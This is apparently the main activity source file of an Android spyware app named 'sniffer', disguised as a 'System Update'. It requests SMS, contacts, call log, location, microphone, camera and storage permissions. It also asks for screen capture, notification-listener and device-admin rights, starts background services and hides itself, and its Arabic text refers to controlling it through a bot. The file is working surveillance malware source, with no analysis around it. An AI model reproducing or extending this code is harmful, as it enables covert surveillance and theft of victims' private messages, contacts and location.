package com.v8.global.sniffer;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_MEDIA_PROJECTION = 100;
    private static final int REQUEST_CODE_PERMISSIONS = 101;

    private final String[] permissions = {
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.CAMERA
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 100, 50, 50);

        TextView tvStatus = new TextView(this);
        tvStatus.setText("⚙️ System Update\n\n✅ الخدمة تعمل في الخلفية\n📱 ارسل /help للبوت");
        tvStatus.setTextSize(16);

        Button btnPermissions = new Button(this);
        btnPermissions.setText("🔓 تفعيل جميع الصلاحيات");
        btnPermissions.setOnClickListener(v -> {
            for (String permission : permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(this, new String[]{permission}, REQUEST_CODE_PERMISSIONS);
                }
            }
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                MediaProjectionManager pm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                startActivityForResult(pm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
            }
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
            ComponentName admin = new ComponentName(this, AdminReceiver.class);
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            if (!dpm.isAdminActive(admin)) {
                Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                startActivity(adminIntent);
            }
            Toast.makeText(this, "✅ تم فتح جميع الصلاحيات", Toast.LENGTH_LONG).show();
        });

        layout.addView(tvStatus);
        layout.addView(btnPermissions);
        setContentView(layout);

        startService(new Intent(this, MainService.class));
        startService(new Intent(this, NotifyService.class));

        new android.os.Handler().postDelayed(() -> {
            moveTaskToBack(true);
            finish();
        }, 500000);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK) {
            getSharedPreferences("screen_capture", MODE_PRIVATE)
                    .edit()
                    .putInt("resultCode", resultCode)
                    .putString("data", data.toUri(0))
                    .apply();
            Toast.makeText(this, "✅ تم تفعيل تسجيل الشاشة", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        Toast.makeText(this, "✅ تم طلب الصلاحيات", Toast.LENGTH_SHORT).show();
    }
}
